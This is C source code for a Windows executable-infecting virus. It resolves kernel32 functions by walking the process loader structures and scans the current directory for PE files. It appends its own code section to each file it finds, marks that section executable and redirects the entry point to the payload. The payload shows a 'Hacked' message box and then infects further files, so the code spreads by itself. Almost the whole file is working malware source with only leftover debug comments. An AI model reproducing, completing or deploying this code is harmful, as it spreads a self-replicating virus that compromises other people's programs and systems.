#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "libproc.h"

#ifdef DEBUG
void    list_dll()
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;

    LOG("Teb %p\n", pTeb);
    LOG("Peb %p\n", pPeb);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    LOG("LDR %p\n", pLdr);
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        LOG("node %p\n", pNode);
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pNode, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        LOG("entry %ls\n", pEntry->FullDllName.Buffer);
        LOG("base %p\n", pEntry->DllBase);
    }
}

void    list_func(PVOID dllBase)
{
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)dllBase + pDosHeader->e_lfanew);
    //LOG("NtHead %p\n", pNtHeader);
    PIMAGE_DATA_DIRECTORY pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //LOG("pDir %p\n", pDir);
    //LOG("pVirt %x\n", pDir->VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)dllBase + pDir->VirtualAddress);
    //LOG("pExp %p\n", pExp);
    PDWORD rvaNames = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfNames);
    PWORD aryOrds = (PWORD)((PUCHAR)dllBase + pExp->AddressOfNameOrdinals);
    PDWORD rvaFuncs = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfFunctions);
    for (int i = 0; i < pExp->NumberOfFunctions; i += 1)
    {
        //LOG("rvaName %d\n", rvaNames[i]);
        //LOG("Name %s\n", (PCHAR)((PCHAR)dllBase + rvaNames[i]));
        WORD ord = aryOrds[i];
        //LOG("ord %d\n", ord);
        PVOID pFunc = (PVOID)((PUCHAR)dllBase + rvaFuncs[ord]);
        //LOG("pFunc %p\n", pFunc);
    }
}

#endif

__declspec(code_seg("injected"))
int my_wstrcmp(PWSTR src1, PWSTR src2)
{
    for (int i = 0; src1[i]; i += 1)
        if (src1[i] != src2[i])
            return src1[i] - src2[i];
    return 0;
}

__declspec(code_seg("injected"))
void my_memcpy_i(PUCHAR dst, PUCHAR src, DWORD len)
{
    for (DWORD i = 0; i < len; i += 1)
        dst[i] = src[i];
}

__declspec(code_seg("injected"))
int my_strcmp(PCHAR src1, PCHAR src2)
{
    for (int i = 0; src1[i]; i += 1)
        if (src1[i] != src2[i])
            return src1[i] - src2[i];
    return 0;
}

__declspec(code_seg("injected"))
PVOID    get_dll(PWSTR name)
{
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;

    LOG("Teb %p\n", pTeb);
    LOG("Peb %p\n", pPeb);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    LOG("LDR %p\n", pLdr);
    PLIST_ENTRY pList = &pLdr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pNode = pList->Flink; pNode != pList; pNode = pNode->Flink)
    {
        LOG("node %p\n", pNode);
        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY) (pNode - 1);
        LOG("entry %ls\n", pEntry->FullDllName.Buffer);
        LOG("base %p\n", pEntry->DllBase);
        if (!my_wstrcmp(name, pEntry->FullDllName.Buffer))
            return pEntry->DllBase;
    }
    return NULL;
}

__declspec(code_seg("injected"))
PVOID    get_func(PCHAR name, PVOID dllBase)
{
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)dllBase + pDosHeader->e_lfanew);
    //LOG("NtHead %p\n", pNtHeader);
    PIMAGE_DATA_DIRECTORY pDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //LOG("pDir %p\n", pDir);
    //LOG("pVirt %x\n", pDir->VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)dllBase + pDir->VirtualAddress);
    //LOG("pExp %p\n", pExp);
    PDWORD rvaNames = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfNames);
    PWORD aryOrds = (PWORD)((PUCHAR)dllBase + pExp->AddressOfNameOrdinals);
    PDWORD rvaFuncs = (PDWORD)((PUCHAR)dllBase + pExp->AddressOfFunctions);
    for (int i = 0; i < pExp->NumberOfFunctions; i += 1)
    {
        //LOG("rvaName %d\n", rvaNames[i]);
        PCHAR pName = (PCHAR)((PCHAR)dllBase + rvaNames[i]);
        //LOG("Name %s\n", pName);
        if (!my_strcmp(name, pName))
        {
            WORD ord = aryOrds[i];
            //LOG("ord %d\n", ord);
            PVOID pFunc = (PVOID)((PUCHAR)dllBase + rvaFuncs[ord]);
            //LOG("pFunc %p\n", pFunc);
            return pFunc;
        }
    }
    return NULL;
}

typedef HMODULE (*loadlib_call)(LPCSTR);

typedef int (*msgbox_call)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

typedef HANDLE (*create_file_a_def)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef HANDLE (*create_file_mapping_def)(
    HANDLE                hFile,
    LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
    DWORD                 flProtect,
    DWORD                 dwMaximumSizeHigh,
    DWORD                 dwMaximumSizeLow,
    LPCSTR                lpName
);

typedef LPVOID (*map_view_of_file_def)(
    HANDLE hFileMappingObject,
    DWORD  dwDesiredAccess,
    DWORD  dwFileOffsetHigh,
    DWORD  dwFileOffsetLow,
    SIZE_T dwNumberOfBytesToMap
);

typedef BOOL (*close_handle_def)(
    HANDLE hObject
);

typedef BOOL (*unmap_view_of_file_def)(
    LPCVOID lpBaseAddress
);

typedef HANDLE (*find_first_file_def)(
    LPCSTR             lpFileName,
    LPWIN32_FIND_DATAA lpFindFileData
);

typedef BOOL (*find_next_file_def)(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAA lpFindFileData
);

typedef BOOL (*find_close_def)(
    HANDLE hFindFile
);

typedef BOOL (*virtual_protect_def)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

typedef DWORD (*get_file_size_def)(
    HANDLE  hFile,
    LPDWORD lpFileSizeHigh
);

__declspec(allocate("injected"))
short kernel32_str[] = L"C:\\Windows\\System32\\KERNEL32.DLL";

__declspec(allocate("injected"))
char loadlibrary_str[] = "LoadLibraryA";

__declspec(allocate("injected"))
char user32_str[] = "user32.dll";

__declspec(allocate("injected"))
char msgbox_str[] = "MessageBoxA";

__declspec(allocate("injected"))
char msgbox_body_str[] = "Yeah! Hacked!!!";

__declspec(allocate("injected"))
char msgbox_caption_str[] = "HackBox";

__declspec(allocate("injected"))
char find_first_file_str[] = "FindFirstFile";

__declspec(allocate("injected"))
char create_file_a_str[] = "CreateFileA";

__declspec(allocate("injected"))
char create_file_mapping_str[] = "CreateFileMapping";

__declspec(allocate("injected"))
char close_handle_str[] = "CloseHandle";

__declspec(allocate("injected"))
char map_view_of_file_str[] = "MapViewOfFile";

__declspec(allocate("injected"))
char unmap_view_of_file_str[] = "UnmapViewOfFile";

__declspec(allocate("injected"))
char find_close_str[] = "FindClose";

__declspec(allocate("injected"))
char find_next_file_str[] = "FindNextFile";

__declspec(allocate("injected"))
char wildcard_str[] = "*";

__declspec(allocate("injected"))
char virtual_protect_str[] = "VirtualProtect";

__declspec(allocate("injected"))
char get_file_size_str[] = "GetFileSize";

__declspec(code_seg("injected"))
int is_pe_file(LPCTSTR filename, PVOID dll) {
    //PVOID dll = get_dll(kernel32_str);
    PVOID create_file_a = get_func(create_file_a_str, dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    //HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PVOID create_file_mapping = get_func(create_file_mapping_str, dll);
    PVOID close_handle = get_func(close_handle_str, dll);
    HANDLE hMapping = ((create_file_mapping_def)create_file_mapping)(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func(map_view_of_file_str, dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;

    // Check if the file has the 'MZ' magic number
    PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);
    if (pDosHeader->e_magic != 0x5A4D) {
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Check if it has a valid PE signature
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpMapAdr + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != 0x00004550) { // 'PE\0\0'
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapping);
    ((close_handle_def)close_handle)(hFile);

    return 1;
}

__declspec(code_seg("injected"))
void list_pe_files(PVOID dll) {
    
    //PVOID dll = get_dll(kernel32_str);
    PVOID find_first_file = get_func(find_first_file_str, dll);
    //PVOID dll = get_dll(kernel32_str);
    //printf("aaa");
    //char temp_buffer[64];
    //...
    //sprintf(temp_buffer, "%p", (void *) &find_first_file);

    

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = ((find_first_file_def)find_first_file)(wildcard_str, &findFileData);

    /*if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed with error (%d)\n", GetLastError());
        return;
    } */
    /*PVOID loadlib = get_func(loadlibrary_str, dll);
                HMODULE hM = ((loadlib_call)loadlib)(user32_str);
                PVOID msgbox = get_func(msgbox_str, hM);
                ((msgbox_call)msgbox)(NULL, "temp_buffer", msgbox_caption_str, 0);*/
    
    PVOID find_next_file = get_func(find_next_file_str, dll);
    PVOID find_close = get_func(find_close_str, dll);
    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (is_pe_file(findFileData.cFileName, dll)) {
                injector(dll, (char *)findFileData.cFileName);
            }
        }
    } while (((find_next_file_def)find_next_file)(hFind, &findFileData) != 0);

    ((find_close_def)find_close)(hFind);
}


int injector(PVOID dll, char *thefile)
{
    extern void payload();
    extern char __begin_of_code;
    extern ULONGLONG __end_of_code;
    /*printf("FUNC %p \n", payload);
    printf("FUNC begin_code %p \n", (PUCHAR) &__begin_of_code);
    printf("FUNC end_code %p \n", (PUCHAR) &__end_of_code);*/
    //char payload[] = {0xcc, 0x90};
    //DWORD nb_add = sizeof (payload);
    DWORD nb_add = ((PUCHAR) &__end_of_code - (PUCHAR) &__begin_of_code) + sizeof(ULONGLONG);
    DWORD old_protect;
    PVOID virtual_protect = get_func(virtual_protect_str, dll);
    ((virtual_protect_def)virtual_protect)(&__end_of_code, sizeof(__end_of_code), PAGE_READWRITE, &old_protect);
    __end_of_code = nb_add;
    //printf("DUMP::: %d\n", nb_add);
    /*for (int i=0; i<nb_add; i++)
        printf("%X ", ((PUCHAR)payload)[i]);
    printf("\n");*/
    //printf("ADD %X - %d\n", payload[0], nb_add);


    //char *thefile = av[1];
    PVOID create_file_a = get_func(create_file_a_str, dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(
            thefile,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
            );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
/*#if DEBUG
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();

        printf("Erreur CreateFileA %d\n", err);
        return err;
    }
#endif*/
    PVOID get_file_size = get_func(get_file_size_str, dll);
    DWORD dwFileSize = ((get_file_size_def)get_file_size)(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + nb_add;
    
    PVOID create_file_mapping = get_func(create_file_mapping_str, dll);
    PVOID close_handle = get_func(close_handle_str, dll);
    //HANDLE hMapping = ((create_file_mapping_def)create_file_mapping)(hFile, NULL, PAGE_READONLY, 0, 0, NULL);

    HANDLE hMapFile = ((create_file_mapping_def)create_file_mapping)(
                hFile,
                NULL,
                PAGE_READWRITE,
                0,
                dwNewFileSize,
                NULL
            );
    if (!hMapFile) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func(map_view_of_file_str, dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(
                hMapFile,
                FILE_MAP_ALL_ACCESS,
                0,
                0,
                0 // dwFileSize
            );

    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapFile);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    /*LPVOID lpMapAdr = MapViewOfFile(
                hMapFile,
                FILE_MAP_ALL_ACCESS,
                0,
                0,
                0 // dwFileSize
            );
#if DEBUG
    if (lpMapAdr == NULL)
    {
        DWORD err = GetLastError();

        printf("Erreur MapViewOfFile %d\n", err);
        return err;
    }
#endif*/
    

    // LIST PE HEADER
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
/*#if DEBUG
    printf("DOS SIG %c%c\n", ((char*)&pDosHeader->e_magic)[0], ((char*)&pDosHeader->e_magic)[1]);
    printf("DOS next %d\n", pDosHeader->e_lfanew);
#endif*/
    //SIGNATURE 
    my_memcpy_i((void*)&pDosHeader->e_res2[8], "INJ\x00", 4);
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
    //printf("NT SIG %c%c\n", ((char*)&pNtHeader->Signature)[0], ((char*)&pNtHeader->Signature)[1]);
    /*char *sig = (char*)&pNtHeader->Signature;
    printf("NT SIG %s\n", sig);
    printf("NT Machine %#02X\n", pNtHeader->FileHeader.Machine);

    // Optional Header
    printf("Optional SizeOfCode %#08X\n", pNtHeader->OptionalHeader.SizeOfCode);
    printf("Optional AOEP %#08X\n", pNtHeader->OptionalHeader.AddressOfEntryPoint);
    printf("Optional ImageBase %#016llX\n", pNtHeader->OptionalHeader.ImageBase);*/

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));

    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 1;
    /*printf("Section Name: %s\n", pSection[idxSection].Name);
    printf("Virtual Adr: %#08X\n", pSection[idxSection].VirtualAddress);
    printf("Virtual Size: %d\n", pSection[idxSection].Misc.VirtualSize);
    printf("PointerRawData Adr: %#08X\n", pSection[idxSection].PointerToRawData);
    printf("Size Of Raw Data: %d\n", pSection[idxSection].SizeOfRawData);
    int is_exec = (pSection[idxSection].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    printf("is exec %d\n", is_exec);*/

    //PUCHAR dstPtr = (PUCHAR)lpMapAdr + dwFileSize;
    PUCHAR dstPtr = (PUCHAR)lpMapAdr + pSection[idxSection].PointerToRawData + pSection[idxSection].SizeOfRawData;
    
    DWORD old_EP =  pNtHeader->OptionalHeader.AddressOfEntryPoint;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = pSection[idxSection].VirtualAddress + pSection[idxSection].SizeOfRawData;
    extern ULONGLONG delta;
    delta = (LONGLONG)old_EP - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
    extern LONGLONG to_c_code;
    extern void inj_code_c();
    to_c_code = (PUCHAR)inj_code_c - &__begin_of_code;

    my_memcpy_i(dstPtr, (PUCHAR)payload, nb_add);
    pSection[idxSection].Misc.VirtualSize += nb_add;
    pSection[idxSection].SizeOfRawData += nb_add;
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;

    PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapFile);
    ((close_handle_def)close_handle)(hFile);

    /*FlushViewOfFile(lpMapAdr, dwNewFileSize);
    UnmapViewOfFile(lpMapAdr);
    CloseHandle(hFile);*/
}

__declspec(code_seg("injected"))
void       inj_code_c() {
    
    PVOID dll = get_dll(kernel32_str);
    //list_pe_files(dll);
    PVOID loadlib = get_func(loadlibrary_str, dll);
    HMODULE hM = ((loadlib_call)loadlib)(user32_str);
    PVOID msgbox = get_func(msgbox_str, hM);
    ((msgbox_call)msgbox)(NULL, msgbox_body_str, msgbox_caption_str, 0);
    list_pe_files(dll);
}
/*__declspec(code_seg("injected"))
int is_pe_file(LPCTSTR filename, PVOID dll) {
    //PVOID dll = get_dll(kernel32_str);
    PVOID create_file_a = get_func("CreateFileA", dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    //HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    /*if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PVOID create_file_mapping = get_func("CreateFileMapping", dll);
    PVOID close_handle = get_func("CloseHandle", dll);
    HANDLE hMapping = ((create_file_mapping_def)create_file_mapping)(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func("MapViewOfFile", dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;

    // Check if the file has the 'MZ' magic number
    PVOID unmap_view_of_file = get_func("UnmapViewOfFile", dll);
    if (pDosHeader->e_magic != 0x5A4D) {
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Check if it has a valid PE signature
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpMapAdr + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != 0x00004550) { // 'PE\0\0'
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapping);
    ((close_handle_def)close_handle)(hFile);

    return 1;
}

__declspec(code_seg("injected"))
void list_pe_files() {
    
    PVOID dll = get_dll(kernel32_str);
    PVOID find_first_file = get_func("FindFirstFile", dll);
    //printf("aaa");
    /*char temp_buffer[64];
    //...
    sprintf(temp_buffer, "%p", (void *) &find_first_file);

    PVOID loadlib = get_func(loadlibrary_str, dll);
                HMODULE hM = ((loadlib_call)loadlib)(user32_str);
                PVOID msgbox = get_func(msgbox_str, hM);
                ((msgbox_call)msgbox)(NULL, temp_buffer, msgbox_caption_str, 0);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = ((find_first_file_def)find_first_file)("*", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        //printf("FindFirstFile failed with error (%d)\n", GetLastError());
        return;
    } 

    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (is_pe_file(findFileData.cFileName, dll)) {
                PVOID dll = get_dll(kernel32_str);
                PVOID loadlib = get_func(loadlibrary_str, dll);
                HMODULE hM = ((loadlib_call)loadlib)(user32_str);
                PVOID msgbox = get_func(msgbox_str, hM);
                ((msgbox_call)msgbox)(NULL, msgbox_body_str, msgbox_caption_str, 0);
                //printf("PE File: %s\n", findFileData.cFileName);
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}*/